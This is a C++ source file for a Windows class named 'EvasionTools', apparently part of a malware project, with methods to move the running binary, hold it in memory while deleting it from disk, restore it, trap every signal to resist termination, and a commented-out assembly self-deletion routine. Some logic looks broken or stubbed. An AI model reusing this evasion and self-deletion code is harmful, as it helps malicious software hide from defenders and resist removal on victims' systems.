class EvasionTools{
	private:
		HANDLE fh;
		char* tmp	=	NULL;

	public:
		static void ChangePID(int _s=0){
			return;
		}
		void HandleAllSignals(function Handle){
			for (int tmp=1; tmp<=64; tmp++)
				signal(tmp, Handle);
		}
		void HandleSignal(int signl, function Handle){
			signal(signl, Handle);
		}
		int MoveMalware(const char* newpath){
			if (MoveFile(Current.name, newpath)){
				strncpy(Current.name, newpath, PAMAX);

				DeleteFile(newpath);

				MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				return 0;
			}
			return 1;
		}
		int MoveIntoMemory(){
			fh=CreateFile(Current.name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (fh == INVALID_HANDLE_VALUE)
				return 1;
			tmp=(char*)malloc(Current.size);
			if(tmp == NULL)
				return 1;
			ReadFile(fh, tmp, Current.size, NULL, NULL);

			CloseHandle(fh);

			MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

			return 0;
		}
		int MoveBackToDisk(const char* loc=Current.name){
			if (tmp==NULL)
				return 1;
			fh=CreateFile(loc, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if(fh == INVALID_HANDLE_VALUE)
				return 1;

			WriteFile(fh, tmp, Current.size, NULL, NULL);
			CloseHandle(fh);

			free(tmp);
			if (loc != Current.name)
				strncpy(Current.name, loc, PAMAX);
			return 0;
		}

		int SelfDestruct(){
			/*
			char buf[MAX_PATH];
			HMODULE module;

			module = GetModuleHandle(0);
			GetModuleFileName(module, buf, MAX_PATH);
			CloseHandle((HANDLE)4);

			asm("lea eax, buf");
			asm("push 0");
			asm("push 0");
			asm("push eax");
			asm("push ExitProcess");
			asm("push module");
			asm("push DeleteFile");
			asm("push UnmapViewOfFile");
			asm("ret");
			*/
			    return 0;
		}
};

